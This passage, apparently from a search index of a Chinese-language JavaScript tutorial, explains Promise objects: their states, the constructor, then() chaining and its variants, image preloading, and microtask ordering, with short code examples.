\u5b9e\u4f8b\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\uff08error\uff09\uff0c\u72b6\u6001\u53d8\u4e3a rejected \u3002 Promise \u6784\u9020\u51fd\u6570 \u00b6 JavaScript \u63d0\u4f9b\u539f\u751f\u7684 Promise \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 Promise \u5b9e\u4f8b\u3002 1 2 3 4 5 6 7 8 9 var promise = new Promise ( function ( resolve , reject ) { // ... if ( /* \u5f02\u6b65\u64cd\u4f5c\u6210\u529f */ ){ resolve ( value ); } else { /* \u5f02\u6b65\u64cd\u4f5c\u5931\u8d25 */ reject ( new Error ()); } }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Promise \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u8be5\u51fd\u6570\u7684\u4e24\u4e2a\u53c2\u6570\u5206\u522b\u662f resolve \u548c reject \u3002\u5b83\u4eec\u662f\u4e24\u4e2a\u51fd\u6570\uff0c\u7531 JavaScript \u5f15\u64ce\u63d0\u4f9b\uff0c\u4e0d\u7528\u81ea\u5df1\u5b9e\u73b0\u3002 resolve \u51fd\u6570\u7684\u4f5c\u7528\u662f\uff0c\u5c06 Promise \u5b9e\u4f8b\u7684\u72b6\u6001\u4ece\u201c\u672a\u5b8c\u6210\u201d\u53d8\u4e3a\u201c\u6210\u529f\u201d\uff08\u5373\u4ece pending \u53d8\u4e3a fulfilled \uff09\uff0c\u5728\u5f02\u6b65\u64cd\u4f5c\u6210\u529f\u65f6\u8c03\u7528\uff0c\u5e76\u5c06\u5f02\u6b65\u64cd\u4f5c\u7684\u7ed3\u679c\uff0c\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u51fa\u53bb\u3002 reject \u51fd\u6570\u7684\u4f5c\u7528\u662f\uff0c\u5c06 Promise \u5b9e\u4f8b\u7684\u72b6\u6001\u4ece\u201c\u672a\u5b8c\u6210\u201d\u53d8\u4e3a\u201c\u5931\u8d25\u201d\uff08\u5373\u4ece pending \u53d8\u4e3a rejected \uff09\uff0c\u5728\u5f02\u6b65\u64cd\u4f5c\u5931\u8d25\u65f6\u8c03\u7528\uff0c\u5e76\u5c06\u5f02\u6b65\u64cd\u4f5c\u62a5\u51fa\u7684\u9519\u8bef\uff0c\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u51fa\u53bb\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 function timeout ( ms ) { return new Promise (( resolve , reject ) => { setTimeout ( resolve , ms , 'done' ); }); } timeout ( 100 ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c timeout(100) \u8fd4\u56de\u4e00\u4e2a Promise \u5b9e\u4f8b\u3002100\u6beb\u79d2\u4ee5\u540e\uff0c\u8be5\u5b9e\u4f8b\u7684\u72b6\u6001\u4f1a\u53d8\u4e3a fulfilled \u3002 Promise.prototype.then() \u00b6 Promise \u5b9e\u4f8b\u7684 then \u65b9\u6cd5\uff0c\u7528\u6765\u6dfb\u52a0\u56de\u8c03\u51fd\u6570\u3002 then \u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u5f02\u6b65\u64cd\u4f5c\u6210\u529f\u65f6\uff08\u53d8\u4e3a fulfilled \u72b6\u6001\uff09\u7684\u56de\u8c03\u51fd\u6570\uff0c\u7b2c\u4e8c\u4e2a\u662f\u5f02\u6b65\u64cd\u4f5c\u5931\u8d25\uff08\u53d8\u4e3a rejected \uff09\u65f6\u7684\u56de\u8c03\u51fd\u6570\uff08\u8be5\u53c2\u6570\u53ef\u4ee5\u7701\u7565\uff09\u3002\u4e00\u65e6\u72b6\u6001\u6539\u53d8\uff0c\u5c31\u8c03\u7528\u76f8\u5e94\u7684\u56de\u8c03\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 var p1 = new Promise ( function ( resolve , reject ) { resolve ( '\u6210\u529f' ); }); p1 . then ( console . log , console . error ); // \"\u6210\u529f\" var p2 = new Promise ( function ( resolve , reject ) { reject ( new Error ( '\u5931\u8d25' )); }); p2 . then ( console . log , console . error ); // Error: \u5931\u8d25 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p1 \u548c p2 \u90fd\u662fPromise \u5b9e\u4f8b\uff0c\u5b83\u4eec\u7684 then \u65b9\u6cd5\u7ed1\u5b9a\u4e24\u4e2a\u56de\u8c03\u51fd\u6570\uff1a\u6210\u529f\u65f6\u7684\u56de\u8c03\u51fd\u6570 console.log \uff0c\u5931\u8d25\u65f6\u7684\u56de\u8c03\u51fd\u6570 console.error \uff08\u53ef\u4ee5\u7701\u7565\uff09\u3002 p1 \u7684\u72b6\u6001\u53d8\u4e3a\u6210\u529f\uff0c p2 \u7684\u72b6\u6001\u53d8\u4e3a\u5931\u8d25\uff0c\u5bf9\u5e94\u7684\u56de\u8c03\u51fd\u6570\u4f1a\u6536\u5230\u5f02\u6b65\u64cd\u4f5c\u4f20\u56de\u7684\u503c\uff0c\u7136\u540e\u5728\u63a7\u5236\u53f0\u8f93\u51fa\u3002 then \u65b9\u6cd5\u53ef\u4ee5\u94fe\u5f0f\u4f7f\u7528\u3002 1 2 3 4 5 6 7 8 p1 . then ( step1 ) . then ( step2 ) . then ( step3 ) . then ( console . log , console . error ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p1 \u540e\u9762\u6709\u56db\u4e2a then \uff0c\u610f\u5473\u4f9d\u6b21\u6709\u56db\u4e2a\u56de\u8c03\u51fd\u6570\u3002\u53ea\u8981\u524d\u4e00\u6b65\u7684\u72b6\u6001\u53d8\u4e3a fulfilled \uff0c\u5c31\u4f1a\u4f9d\u6b21\u6267\u884c\u7d27\u8ddf\u5728\u540e\u9762\u7684\u56de\u8c03\u51fd\u6570\u3002 \u6700\u540e\u4e00\u4e2a then \u65b9\u6cd5\uff0c\u56de\u8c03\u51fd\u6570\u662f console.log \u548c console.error \uff0c\u7528\u6cd5\u4e0a\u6709\u4e00\u70b9\u91cd\u8981\u7684\u533a\u522b\u3002 console.log \u53ea\u663e\u793a step3 \u7684\u8fd4\u56de\u503c\uff0c\u800c console.error \u53ef\u4ee5\u663e\u793a p1 \u3001 step1 \u3001 step2 \u3001 step3 \u4e4b\u4e2d\u4efb\u610f\u4e00\u4e2a\u53d1\u751f\u7684\u9519\u8bef\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u5982\u679c step1 \u7684\u72b6\u6001\u53d8\u4e3a rejected \uff0c\u90a3\u4e48 step2 \u548c step3 \u90fd\u4e0d\u4f1a\u6267\u884c\u4e86\uff08\u56e0\u4e3a\u5b83\u4eec\u662f resolved \u7684\u56de\u8c03\u51fd\u6570\uff09\u3002Promise \u5f00\u59cb\u5bfb\u627e\uff0c\u63a5\u4e0b\u6765\u7b2c\u4e00\u4e2a\u4e3a rejected \u7684\u56de\u8c03\u51fd\u6570\uff0c\u5728\u4e0a\u9762\u4ee3\u7801\u4e2d\u662f console.error \u3002\u8fd9\u5c31\u662f\u8bf4\uff0cPromise \u5bf9\u8c61\u7684\u62a5\u9519\u5177\u6709\u4f20\u9012\u6027\u3002 then() \u7528\u6cd5\u8fa8\u6790 \u00b6 Promise \u7684\u7528\u6cd5\uff0c\u7b80\u5355\u8bf4\u5c31\u662f\u4e00\u53e5\u8bdd\uff1a\u4f7f\u7528 then \u65b9\u6cd5\u6dfb\u52a0\u56de\u8c03\u51fd\u6570\u3002\u4f46\u662f\uff0c\u4e0d\u540c\u7684\u5199\u6cd5\u6709\u4e00\u4e9b\u7ec6\u5fae\u7684\u5dee\u522b\uff0c\u8bf7\u770b\u4e0b\u9762\u56db\u79cd\u5199\u6cd5\uff0c\u5b83\u4eec\u7684\u5dee\u522b\u5728\u54ea\u91cc\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // \u5199\u6cd5\u4e00 f1 (). then ( function () { return f2 (); }); // \u5199\u6cd5\u4e8c f1 (). then ( function () { f2 (); }); // \u5199\u6cd5\u4e09 f1 (). then ( f2 ()); // \u5199\u6cd5\u56db f1 (). then ( f2 ); \u4e3a\u4e86\u4fbf\u4e8e\u8bb2\u89e3\uff0c\u4e0b\u9762\u8fd9\u56db\u79cd\u5199\u6cd5\u90fd\u518d\u7528 then \u65b9\u6cd5\u63a5\u4e00\u4e2a\u56de\u8c03\u51fd\u6570 f3 \u3002\u5199\u6cd5\u4e00\u7684 f3 \u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\uff0c\u662f f2 \u51fd\u6570\u7684\u8fd0\u884c\u7ed3\u679c\u3002 1 2 3 f1 (). then ( function () { return f2 (); }). then ( f3 ); \u5199\u6cd5\u4e8c\u7684 f3 \u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\u662f undefined \u3002 1 2 3 4 f1 (). then ( function () { f2 (); return ; }). then ( f3 ); \u5199\u6cd5\u4e09\u7684 f3 \u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\uff0c\u662f f2 \u51fd\u6570\u8fd4\u56de\u7684\u51fd\u6570\u7684\u8fd0\u884c\u7ed3\u679c\u3002 1 2 f1 (). then ( f2 ()) . then ( f3 ); \u5199\u6cd5\u56db\u4e0e\u5199\u6cd5\u4e00\u53ea\u6709\u4e00\u4e2a\u5dee\u522b\uff0c\u90a3\u5c31\u662f f2 \u4f1a\u63a5\u6536\u5230 f1() \u8fd4\u56de\u7684\u7ed3\u679c\u3002 1 2 f1 (). then ( f2 ) . then ( f3 ); \u5b9e\u4f8b\uff1a\u56fe\u7247\u52a0\u8f7d \u00b6 \u4e0b\u9762\u662f\u4f7f\u7528 Promise \u5b8c\u6210\u56fe\u7247\u7684\u52a0\u8f7d\u3002 1 2 3 4 5 6 7 8 var preloadImage = function ( path ) { return new Promise ( function ( resolve , reject ) { var image = new Image (); image . onload = resolve ; image . onerror = reject ; image . src = path ; }); }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c image \u662f\u4e00\u4e2a\u56fe\u7247\u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002\u5b83\u6709\u4e24\u4e2a\u4e8b\u4ef6\u76d1\u542c\u5c5e\u6027\uff0c onload \u5c5e\u6027\u5728\u56fe\u7247\u52a0\u8f7d\u6210\u529f\u540e\u8c03\u7528\uff0c onerror \u5c5e\u6027\u5728\u52a0\u8f7d\u5931\u8d25\u8c03\u7528\u3002 \u4e0a\u9762\u7684 preloadImage() \u51fd\u6570\u7528\u6cd5\u5982\u4e0b\u3002 1 2 3 preloadImage ( 'https://example.com/my.jpg' ) . then ( function ( e ) { document . body . append ( e . target ) }) . then ( function () { console . log ( '\u52a0\u8f7d\u6210\u529f' ) }) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u56fe\u7247\u52a0\u8f7d\u6210\u529f\u4ee5\u540e\uff0c onload \u5c5e\u6027\u4f1a\u8fd4\u56de\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\uff0c\u56e0\u6b64\u7b2c\u4e00\u4e2a then() \u65b9\u6cd5\u7684\u56de\u8c03\u51fd\u6570\uff0c\u4f1a\u63a5\u6536\u5230\u8fd9\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\u3002\u8be5\u5bf9\u8c61\u7684 target \u5c5e\u6027\u5c31\u662f\u56fe\u7247\u52a0\u8f7d\u540e\u751f\u6210\u7684 DOM \u8282\u70b9\u3002 \u5c0f\u7ed3 \u00b6 Promise \u7684\u4f18\u70b9\u5728\u4e8e\uff0c\u8ba9\u56de\u8c03\u51fd\u6570\u53d8\u6210\u4e86\u89c4\u8303\u7684\u94fe\u5f0f\u5199\u6cd5\uff0c\u7a0b\u5e8f\u6d41\u7a0b\u53ef\u4ee5\u770b\u5f97\u5f88\u6e05\u695a\u3002\u5b83\u6709\u4e00\u6574\u5957\u63a5\u53e3\uff0c\u53ef\u4ee5\u5b9e\u73b0\u8bb8\u591a\u5f3a\u5927\u7684\u529f\u80fd\uff0c\u6bd4\u5982\u540c\u65f6\u6267\u884c\u591a\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u7b49\u5230\u5b83\u4eec\u7684\u72b6\u6001\u90fd\u6539\u53d8\u4ee5\u540e\uff0c\u518d\u6267\u884c\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\uff1b\u518d\u6bd4\u5982\uff0c\u4e3a\u591a\u4e2a\u56de\u8c03\u51fd\u6570\u4e2d\u629b\u51fa\u7684\u9519\u8bef\uff0c\u7edf\u4e00\u6307\u5b9a\u5904\u7406\u65b9\u6cd5\u7b49\u7b49\u3002 \u800c\u4e14\uff0cPromise \u8fd8\u6709\u4e00\u4e2a\u4f20\u7edf\u5199\u6cd5\u6ca1\u6709\u7684\u597d\u5904\uff1a\u5b83\u7684\u72b6\u6001\u4e00\u65e6\u6539\u53d8\uff0c\u65e0\u8bba\u4f55\u65f6\u67e5\u8be2\uff0c\u90fd\u80fd\u5f97\u5230\u8fd9\u4e2a\u72b6\u6001\u3002\u8fd9\u610f\u5473\u7740\uff0c\u65e0\u8bba\u4f55\u65f6\u4e3a Promise \u5b9e\u4f8b\u6dfb\u52a0\u56de\u8c03\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u90fd\u80fd\u6b63\u786e\u6267\u884c\u3002\u6240\u4ee5\uff0c\u4f60\u4e0d\u7528\u62c5\u5fc3\u662f\u5426\u9519\u8fc7\u4e86\u67d0\u4e2a\u4e8b\u4ef6\u6216\u4fe1\u53f7\u3002\u5982\u679c\u662f\u4f20\u7edf\u5199\u6cd5\uff0c\u901a\u8fc7\u76d1\u542c\u4e8b\u4ef6\u6765\u6267\u884c\u56de\u8c03\u51fd\u6570\uff0c\u4e00\u65e6\u9519\u8fc7\u4e86\u4e8b\u4ef6\uff0c\u518d\u6dfb\u52a0\u56de\u8c03\u51fd\u6570\u662f\u4e0d\u4f1a\u6267\u884c\u7684\u3002 Promise \u7684\u7f3a\u70b9\u662f\uff0c\u7f16\u5199\u7684\u96be\u5ea6\u6bd4\u4f20\u7edf\u5199\u6cd5\u9ad8\uff0c\u800c\u4e14\u9605\u8bfb\u4ee3\u7801\u4e5f\u4e0d\u662f\u4e00\u773c\u53ef\u4ee5\u770b\u61c2\u3002\u4f60\u53ea\u4f1a\u770b\u5230\u4e00\u5806 then \uff0c\u5fc5\u987b\u81ea\u5df1\u5728 then \u7684\u56de\u8c03\u51fd\u6570\u91cc\u9762\u7406\u6e05\u903b\u8f91\u3002 \u5fae\u4efb\u52a1 \u00b6 Promise \u7684\u56de\u8c03\u51fd\u6570\u5c5e\u4e8e\u5f02\u6b65\u4efb\u52a1\uff0c\u4f1a\u5728\u540c\u6b65\u4efb\u52a1\u4e4b\u540e\u6267\u884c\u3002 1 2 3 4 5 6 7 new Promise ( function ( resolve , reject ) { resolve ( 1 ); }). then ( console . log ); console . log ( 2 ); // 2 // 1 \u4e0a\u9762\u4ee3\u7801\u4f1a\u5148\u8f93\u51fa2\uff0c\u518d\u8f93\u51fa1\u3002\u56e0\u4e3a console.log(2) \u662f\u540c\u6b65\u4efb\u52a1\uff0c\u800c then \u7684\u56de\u8c03\u51fd\u6570\u5c5e\u4e8e\u5f02\u6b65\u4efb\u52a1\uff0c\u4e00\u5b9a\u665a\u4e8e\u540c\u6b65\u4efb\u52a1\u6267\u884c\u3002 \u4f46\u662f\uff0cPromise \u7684\u56de\u8c03\u51fd\u6570\u4e0d\u662f\u6b63\u5e38\u7684\u5f02\u6b65\u4efb\u52a1\uff0c\u800c\u662f\u5fae\u4efb\u52a1\uff08microtask\uff09\u3002\u5b83\u4eec\u7684\u533a\u522b\u5728\u4e8e\uff0c\u6b63\u5e38\u4efb\u52a1\u8ffd\u52a0\u5230\u4e0b\u4e00\u8f6e\u4e8b\u4ef6\u5faa\u73af\uff0c\u5fae\u4efb\u52a1\u8ffd\u52a0\u5230\u672c\u8f6e\u4e8b\u4ef6\u5faa\u73af\u3002\u8fd9\u610f\u5473\u7740\uff0c\u5fae\u4efb\u52a1\u7684\u6267\u884c\u65f6\u95f4\u4e00\u5b9a\u65e9\u4e8e\u6b63\u5e38\u4efb\u52a1\u3002 1 2 3 4 5 6 7 8 9 10 11 12 setTimeout ( function () { console . log ( 1 ); }, 0 ); new Promise ( function ( resolve , reject ) { resolve ( 2 ); }). then ( console . log ); console . log ( 3 ); // 3 // 2 // 1 \u4e0a\u9762\u4ee3\u7801\u7684\u8f93\u51fa\u7ed3\u679c\u662f 321 \u3002\u8fd9\u8bf4\u660e then \u7684\u56de\u8c03\u51fd\u6570\u7684\u6267\u884c\u65f6\u95f4\uff0c\u65e9\u4e8e setTimeout(fn, 0) \u3002\u56e0\u4e3a then \u662f\u672c\u8f6e\u4e8b\u4ef6\u5faa\u73af\u6267\u884c\uff0c setTimeout(fn, 0) \u5728\u4e0b\u4e00\u8f6e\u4e8b\u4ef6\u5faa\u73af\u5f00\u59cb\u65f6\u6267\u884c\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Sebastian Porto, Asynchronous JS: Callbacks, Listeners, Control Flow Libs and Promises Rhys Brett-Bowen, Promises/A+ - understanding the spec through implementation Matt Podwysocki, Amanda Silver, Asynchronous Programming in JavaScript with \u201cPromises\u201d Marc Harter, Promise A+ Implementation Bryan Klimt, What\u2019s so great about JavaScript Promises? Jake Archibald, JavaScript Promises There and back again Mikito Takada, 7. Control flow, Mixu's Node book","title":"Promise \u5bf9\u8c61"},{"location":"async/promise/#promise","text":"","title":"Promise \u5bf9\u8c61"},{"location":"async/promise/#_1","text":"Promise \u5bf9\u8c61\u662f JavaScript \u7684\u5f02\u6b65\u64cd\u4f5c\u89e3\u51b3\u65b9\u6848\uff0c\u4e3a\u5f02\u6b65\u64cd\u4f5c\u63d0\u4f9b\u7edf\u4e00\u63a5\u53e3\u3002\u5b83\u8d77\u5230\u4ee3\u7406\u4f5c\u7528\uff08proxy\uff09\uff0c\u5145\u5f53\u5f02\u6b65\u64cd\u4f5c\u4e0e\u56de\u8c03\u51fd\u6570\u4e4b\u95f4\u7684\u4e2d\u4ecb\uff0c\u4f7f\u5f97\u5f02\u6b65\u64cd\u4f5c\u5177\u5907\u540c\u6b65\u64cd\u4f5c\u7684\u63a5\u53e3\u3002Promise \u53ef\u4ee5\u8ba9\u5f02\u6b65\u64cd\u4f5c\u5199\u8d77\u6765\uff0c\u5c31\u50cf\u5728\u5199\u540c\u6b65\u64cd\u4f5c\u7684\u6d41\u7a0b\uff0c\u800c\u4e0d\u5fc5\u4e00\u5c42\u5c42\u5730\u5d4c\u5957\u56de\u8c03\u51fd\u6570\u3002 \u6ce8\u610f\uff0c\u672c\u7ae0\u53ea\u662f Promise \u5bf9\u8c61\u7684\u7b80\u5355\u4ecb\u7ecd\u3002\u4e3a\u4e86\u907f\u514d\u4e0e\u540e\u7eed\u6559\u7a0b\u7684\u91cd\u590d\uff0c\u66f4\u5b8c\u6574\u7684\u4ecb\u7ecd\u8bf7\u770b \u300aES6 \u6807\u51c6\u5165\u95e8\u300b \u7684 \u300aPromise \u5bf9\u8c61\u300b \u4e00\u7ae0\u3002 \u9996\u5148\uff0cPromise \u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4e5f\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u3002 1 2 3 4 5 function f1 ( resolve , reject ) { // \u5f02\u6b65\u4ee3\u7801... } var p1 = new Promise ( f1 ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Promise \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u56de\u8c03\u51fd\u6570 f1 \u4f5c\u4e3a\u53c2\u6570\uff0c f1 \u91cc\u9762\u662f\u5f02\u6b65\u64cd\u4f5c\u7684\u4ee3\u7801\u3002\u7136\u540e\uff0c\u8fd4\u56de\u7684 p1 \u5c31\u662f\u4e00\u4e2a Promise \u5b9e\u4f8b\u3002 Promise \u7684\u8bbe\u8ba1\u601d\u60f3\u662f\uff0c\u6240\u6709\u5f02\u6b65\u4efb\u52a1\u90fd\u8fd4\u56de\u4e00\u4e2a Promise \u5b9e\u4f8b\u3002Promise \u5b9e\u4f8b\u6709\u4e00\u4e2a then \u65b9\u6cd5\uff0c\u7528\u6765\u6307\u5b9a\u4e0b\u4e00\u6b65\u7684\u56de\u8c03\u51fd\u6570\u3002 1 2 var p1 = new Promise ( f1 ); p1 . then ( f2 ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c f1 \u7684\u5f02\u6b65\u64cd\u4f5c\u6267\u884c\u5b8c\u6210\uff0c\u5c31\u4f1a\u6267\u884c f2 \u3002 \u4f20\u7edf\u7684\u5199\u6cd5\u53ef\u80fd\u9700\u8981\u628a f2 \u4f5c\u4e3a\u56de\u8c03\u51fd\u6570\u4f20\u5165 f1 \uff0c\u6bd4\u5982\u5199\u6210 f1(f2) \uff0c\u5f02\u6b65\u64cd\u4f5c\u5b8c\u6210\u540e\uff0c\u5728 f1 \u5185\u90e8\u8c03\u7528 f2 \u3002Promise \u4f7f\u5f97 f1 \u548c f2 \u53d8\u6210\u4e86\u94fe\u5f0f\u5199\u6cd5\u3002\u4e0d\u4ec5\u6539\u5584\u4e86\u53ef\u8bfb\u6027\uff0c\u800c\u4e14\u5bf9\u4e8e\u591a\u5c42\u5d4c\u5957\u7684\u56de\u8c03\u51fd\u6570\u5c24\u5176\u65b9\u4fbf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // \u4f20\u7edf\u5199\u6cd5 step1 ( function ( value1 ) { step2 ( value1 , function ( value2 ) { step3 ( value2 , function ( value3 ) { step4 ( value3 , function ( value4 ) { // ... }); }); }); }); // Promise \u7684\u5199\u6cd5 ( new Promise ( step1 )) . then ( step2 ) . then ( step3 ) . then ( step4 ); \u4ece\u4e0a\u9762\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\uff0c\u91c7\u7528 Promises \u4ee5\u540e\uff0c\u7a0b\u5e8f\u6d41\u7a0b\u53d8\u5f97\u975e\u5e38\u6e05\u695a\uff0c\u5341\u5206\u6613\u8bfb\u3002\u6ce8\u610f\uff0c\u4e3a\u4e86\u4fbf\u4e8e\u7406\u89e3\uff0c\u4e0a\u9762\u4ee3\u7801\u7684 Promise \u5b9e\u4f8b\u7684\u751f\u6210\u683c\u5f0f\uff0c\u505a\u4e86\u7b80\u5316\uff0c\u771f\u6b63\u7684\u8bed\u6cd5\u8bf7\u53c2\u7167\u4e0b\u6587\u3002 \u603b\u7684\u6765\u8bf4\uff0c\u4f20\u7edf\u7684\u56de\u8c03\u51fd\u6570\u5199\u6cd5\u4f7f\u5f97\u4ee3\u7801\u6df7\u6210\u4e00\u56e2\uff0c\u53d8\u5f97\u6a2a\u5411\u53d1\u5c55\u800c\u4e0d\u662f\u5411\u4e0b\u53d1\u5c55\u3002Promise \u5c31\u662f\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u4f7f\u5f97\u5f02\u6b65\u6d41\u7a0b\u53ef\u4ee5\u5199\u6210\u540c\u6b65\u6d41\u7a0b\u3002 Promise \u539f\u672c\u53ea\u662f\u793e\u533a\u63d0\u51fa\u7684\u4e00\u4e2a\u6784\u60f3\uff0c\u4e00\u4e9b\u51fd\u6570\u5e93\u7387\u5148\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u529f\u80fd\u3002ECMAScript 6 \u5c06\u5176\u5199\u5165\u8bed\u8a00\u6807\u51c6\uff0c\u76ee\u524d JavaScript \u539f\u751f\u652f\u6301 Promise \u5bf9\u8c61\u3002","title":"\u6982\u8ff0"},{"location":"async/promise/#promise_1","text":"Promise \u5bf9\u8c61\u901a\u8fc7\u81ea\u8eab\u7684\u72b6\u6001\uff0c\u6765\u63a7\u5236\u5f02\u6b65\u64cd\u4f5c\u3002Promise \u5b9e\u4f8b\u5177\u6709\u4e09\u79cd\u72b6\u6001\u3002 \u5f02\u6b65\u64cd\u4f5c\u672a\u5b8c\u6210\uff08pending\uff09 \u5f02\u6b65\u64cd\u4f5c\u6210\u529f\uff08fulfilled\uff09 \u5f02\u6b65\u64cd\u4f5c\u5931\u8d25\uff08rejected\uff09 \u4e0a\u9762\u4e09\u79cd\u72b6\u6001\u91cc\u9762\uff0c fulfilled \u548c rejected \u5408\u5728\u4e00\u8d77\u79f0\u4e3a resolved \uff08\u5df2\u5b9a\u578b\uff09\u3002 \u8fd9\u4e09\u79cd\u7684\u72b6\u6001\u7684\u53d8\u5316\u9014\u5f84\u53ea\u6709\u4e24\u79cd\u3002 \u4ece\u201c\u672a\u5b8c\u6210\u201d\u5230\u201c\u6210\u529f\u201d \u4ece\u201c\u672a\u5b8c\u6210\u201d\u5230\u201c\u5931\u8d25\u201d \u4e00\u65e6\u72b6\u6001\u53d1\u751f\u53d8\u5316\uff0c\u5c31\u51dd\u56fa\u4e86\uff0c\u4e0d\u4f1a\u518d\u6709\u65b0\u7684\u72b6\u6001\u53d8\u5316\u3002\u8fd9\u4e5f\u662f Promise \u8fd9\u4e2a\u540d\u5b57\u7684\u7531\u6765\uff0c\u5b83\u7684\u82f1\u8bed\u610f\u601d\u662f\u201c\u627f\u8bfa\u201d\uff0c\u4e00\u65e6\u627f\u8bfa\u6210\u6548\uff0c\u5c31\u4e0d\u5f97\u518d\u6539\u53d8\u4e86\u3002\u8fd9\u4e5f\u610f\u5473\u7740\uff0cPromise \u5b9e\u4f8b\u7684\u72b6\u6001\u53d8\u5316\u53ea\u53ef\u80fd\u53d1\u751f\u4e00\u6b21\u3002 \u56e0\u6b64\uff0cPromise \u7684\u6700\u7ec8\u7ed3\u679c\u53ea\u6709\u4e24\u79cd\u3002 \u5f02\u6b65\u64cd\u4f5c\u6210\u529f\uff0cPromise \u5b9e\u4f8b\u4f20\u56de\u4e00\u4e2a\u503c\uff08value\uff09\uff0c\u72b6\u6001\u53d8\u4e3a fulfilled \u3002 \u5f02\u6b65\u64cd\u4f5c\u5931\u8d25\uff0cPromise \u5b9e\u4f8b\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\uff08error\uff09\uff0c\u72b6\u6001\u53d8\u4e3a rejected \u3002","title":"Promise \u5bf9\u8c61\u7684\u72b6\u6001"},{"location":"async/promise/#promise_2","text":"JavaScript \u63d0\u4f9b\u539f\u751f\u7684 Promise \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 Promise \u5b9e\u4f8b\u3002 1 2 3 4 5 6 7 8 9 var promise = new Promise ( function ( resolve , reject ) { // ... if ( /* \u5f02\u6b65\u64cd\u4f5c\u6210\u529f */ ){ resolve ( value ); } else { /* \u5f02\u6b65\u64cd\u4f5c\u5931\u8d25 */ reject ( new Error ()); } }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Promise \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u8be5\u51fd\u6570\u7684\u4e24\u4e2a\u53c2\u6570\u5206\u522b\u662f resolve \u548c reject \u3002\u5b83\u4eec\u662f\u4e24\u4e2a\u51fd\u6570\uff0c\u7531 JavaScript \u5f15\u64ce\u63d0\u4f9b\uff0c\u4e0d\u7528\u81ea\u5df1\u5b9e\u73b0\u3002 resolve \u51fd\u6570\u7684\u4f5c\u7528\u662f\uff0c\u5c06 Promise \u5b9e\u4f8b\u7684\u72b6\u6001\u4ece\u201c\u672a\u5b8c\u6210\u201d\u53d8\u4e3a\u201c\u6210\u529f\u201d\uff08\u5373\u4ece pending \u53d8\u4e3a fulfilled \uff09\uff0c\u5728\u5f02\u6b65\u64cd\u4f5c\u6210\u529f\u65f6\u8c03\u7528\uff0c\u5e76\u5c06\u5f02\u6b65\u64cd\u4f5c\u7684\u7ed3\u679c\uff0c\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u51fa\u53bb\u3002 reject \u51fd\u6570\u7684\u4f5c\u7528\u662f\uff0c\u5c06 Promise \u5b9e\u4f8b\u7684\u72b6\u6001\u4ece\u201c\u672a\u5b8c\u6210\u201d\u53d8\u4e3a\u201c\u5931\u8d25\u201d\uff08\u5373\u4ece pending \u53d8\u4e3a rejected \uff09\uff0c\u5728\u5f02\u6b65\u64cd\u4f5c\u5931\u8d25\u65f6\u8c03\u7528\uff0c\u5e76\u5c06\u5f02\u6b65\u64cd\u4f5c\u62a5\u51fa\u7684\u9519\u8bef\uff0c\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u51fa\u53bb\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 function timeout ( ms ) { return new Promise (( resolve , reject ) => { setTimeout ( resolve , ms , 'done' ); }); } timeout ( 100 ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c timeout(100) \u8fd4\u56de\u4e00\u4e2a Promise \u5b9e\u4f8b\u3002100\u6beb\u79d2\u4ee5\u540e\uff0c\u8be5\u5b9e\u4f8b\u7684\u72b6\u6001\u4f1a\u53d8\u4e3a fulfilled \u3002","title":"Promise \u6784\u9020\u51fd\u6570"},{"location":"async/promise/#promiseprototypethen","text":"Promise \u5b9e\u4f8b\u7684 then \u65b9\u6cd5\uff0c\u7528\u6765\u6dfb\u52a0\u56de\u8c03\u51fd\u6570\u3002 then 